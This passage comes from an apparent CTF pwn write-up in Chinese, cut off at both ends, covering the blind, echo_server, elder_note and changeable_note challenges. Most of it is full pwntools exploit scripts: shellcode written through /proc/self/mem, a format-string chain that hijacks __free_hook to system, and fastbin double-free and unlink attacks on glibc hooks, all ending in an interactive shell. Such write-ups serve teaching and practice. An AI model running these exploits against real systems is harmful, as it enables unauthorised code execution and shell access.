class="line">io.sendline(<span class="built_in">str</span>(-(elf.sym[<span class="string">&#x27;dist&#x27;</span>]-_fini_array)//<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">proc_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">10</span>)-<span class="number">0x12e0</span></span><br><span class="line">log.success(<span class="string">&quot;proc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get env_stack</span></span><br><span class="line">envir=libc_base+libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">dist=proc_base+elf.sym[<span class="string">&quot;dist&quot;</span>]</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>((envir-dist)//<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">env_stack=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">log.success(<span class="string">&quot;env_stack===&gt;&quot;</span>+<span class="built_in">hex</span>(env_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#write ret_addr</span></span><br><span class="line">ret_id=(env_stack-<span class="number">0x100</span>-dist)//<span class="number">8</span></span><br><span class="line">backdoor=proc_base+<span class="number">0x16AA</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">&quot;0 &quot;</span>+<span class="built_in">str</span>(ret_id)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(backdoor))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><hr><p>题目质量都好高，但这几天打这个比赛都没复习高数了，之后的 week 题就不打了，但要复盘。</p><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h3><p>一道盲打题，首先告诉了我们 write 的 libc 地址，我们便能利用<code>LibcSearcher</code>获取 libc。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/220601/13/24783/19717/63c7ae06F70f2d582/3bd0aaa0971b77d5.png" style="zoom:80%;" /><p>然后程序告诉我们可以打开一个文件，这里需要我们了解一个新的知识点：Linux 内核提供了一种通过 <strong>/proc</strong> 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc 文件系统是一个<strong>伪文件</strong>系统，它只存在内存当中，而不占用外存空间。读取 <strong>/proc/self/maps</strong> 可以得到当前进程的<strong>内存映射关系</strong>，通过读该文件的内容可以<strong>得到内存代码段基址</strong>。<span style='color:red;font-weight:550'>/proc/self/mem</span> 是进程的内存内容，<strong>通过修改该文件相当于直接修改当前进程的内存</strong>。该文件不能直接读取，需要结合 maps 的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p><p>程序给了我们<code>libc基址</code>，因此我们只需打开<code>/proc/self/mem</code>文件，打开后，程序让我们输入一个地址进行篡改，因为 main 函数 ret 时返回的是<code>__libc_start_main</code>，因此我们篡改该内存即可（<strong>直接写内存绕开了 libc 文件不可写的防护</strong>）。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/7080/30/21758/7849/63c7ae0bF0edbfbdf/eb5364df131c83a0.png" style="zoom:80%;" /><p>但因为 main 函数 <strong>ret 的是 libc_start_main+???</strong> 而不是 libc_start_main+0，所以我们需要足够多的 nop 来覆盖到 libc_start_main+???，令其滑倒在 shellcode 上。</p><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">51916</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line">brute()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;: 0x&#x27;</span>)</span><br><span class="line">write=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line">libc_base=write-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base===&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__libc_start_main=libc_base+libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;/proc/self/mem\x00&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(__libc_start_main))</span><br><span class="line"></span><br><span class="line">payload=asm(shellcraft.sh()).rjust(<span class="number">0x300</span>,asm(<span class="string">&#x27;nop&#x27;</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="echo-server"><a href="#echo-server" class="headerlink" title="echo_server"></a>echo_server</h3><p>在堆上构造栈的 fmt 链子的题目，总算有机会复盘一遍了，确实麻烦。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/38973/13/22033/28494/63c7aeacFa044f73d/7945680aac3fdbbe.png" style="zoom:80%;" /><p>程序逻辑很简单，就是一个不断循环的格式化字符串漏洞。</p><p>首先我们动调看一下栈的结构：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/184800/16/30987/103139/63c7aeacF807096d0/dac72b77454e61c7.png" style="zoom:80%;" /><p>通过格式化字符串我们可以泄露出<code>rbp</code>和<code>libc</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%6$p-%13$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;rbp=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(rbp)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br></pre></td></tr></table></figure><p>因为 realloc 的<code>size</code>位为 0 时等同于 free，因此接下来我们选择在栈上构造 __free_hook。</p><p>如何构造就需要用到 rbp 链了：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/8746/26/21445/113047/63c7aeadF796627ad/e564dde984db2034.png" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main_in_stack=(rbp &amp; <span class="number">0xFF</span>)+<span class="number">0x18</span></span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_in_stack:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_in_stack))</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack+<span class="number">2</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><p>此时我们选择先构造中间俩字节，所以将 rbp 修改为<code>目标地址+2</code>处</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/32370/12/20382/52439/63c7aeafF1f410f93/36d22f9cd324267d.png" style="zoom:80%;" /><p>然后我们利用格式化字符串，将 rbp 指向处写入 __free_hook 对应的 2 个字节：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>((__free_hook &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/181181/27/31734/49453/63c7aeaeF8db3bcc9/9774a07007e1c680.png" style="zoom:80%;" /><p>重复上述步骤我们同理可以修改最后两个字节：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/63189/30/23701/56144/63c7af8cFe4ad12d6/d1e9b4b51c1f0698.png" style="zoom:80%;" /><p>这样我们在栈上就有了<code>__free_hook</code>，重复上述步骤，通过利用当前 rbp 修改写入位置，我们便能将<code>__free_hook</code>劫持为<code>system</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">2</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">4</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+4=&gt;(system &gt;&gt; 32) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/63189/30/23701/56144/63c7af8cFe4ad12d6/d1e9b4b51c1f0698.png" style="zoom:80%;" /><p>完整 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="comment">#get libc &amp; rbp</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%6$p-%13$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;rbp=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(rbp)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">__libc_start_main_in_stack=(rbp &amp; <span class="number">0xFF</span>)+<span class="number">0x18</span></span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_in_stack:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_in_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp1=&gt;rbp2</span></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main+2</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack+<span class="number">2</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main+2</span></span><br><span class="line"><span class="comment">#__libc_start_main+2=(__free_hook &gt;&gt; 16) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>((__free_hook &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp1=&gt;rbp2</span></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main</span></span><br><span class="line"><span class="comment">#__libc_start_main+0=__free_hook &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"><span class="comment">#now original __libc_start_main_in_stack = __free_hook</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#__free_hook+0=&gt;(system) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__free_hook</span></span><br><span class="line"><span class="comment">#__free_hook=__free_hook+2</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">2</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+2=&gt;(system &gt;&gt; 16) &amp; 0xFFFF</span></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__free_hook+2</span></span><br><span class="line"><span class="comment">#__free_hook+2=__free_hook+4</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">4</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+4=&gt;(system &gt;&gt; 32) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"><span class="comment">#now free_hook =&gt; system</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="elder-note"><a href="#elder-note" class="headerlink" title="elder_note"></a>elder_note</h3><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/129636/40/34283/6010/63c7b2c5F9c8406a8/c2b2fed3e7319002.png" style="zoom:80%;" /><p>libc2.23 下的 <strong>UAF</strong>，最大可申请 0x100 大小的 chunk，所以通过 unsorted bin leak 便能泄露出 libc。通过 double free 将 chunk 分配到<code>&amp;_malloc_hook-0x23</code>处。但因为无法满足 one_gadget 的条件，所以配合<code>&amp;_realloc_hook</code> 调整栈帧，即将<code>&amp;_malloc_hook</code>劫持为<code>&amp;realloc+?</code>，再将<code>&amp;_realloc_hook</code>劫持为 one_gadget。</p><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">0x100</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x1</span>, <span class="number">0x68</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x2</span>, <span class="number">0x68</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x68</span> </span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">__realloc_hook = libc_base + libc.sym[<span class="string">&quot;__realloc_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xb</span> + p64(one_gadget) + p64(realloc + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="changeable-note"><a href="#changeable-note" class="headerlink" title="changeable_note"></a>changeable_note</h3><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/103097/3/27197/21707/63c7b2c8Ff5b87dbc/81e0c45a66912503.png" style="zoom:80%;" /><p>edit 里有个溢出函数<code>gets</code>，因此可以构造 unlink 改写 notes 数组的内容为想要的地址<code>&amp;_free_hook</code>，然后再将目标函数篡改为<code>system</code>。</p><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 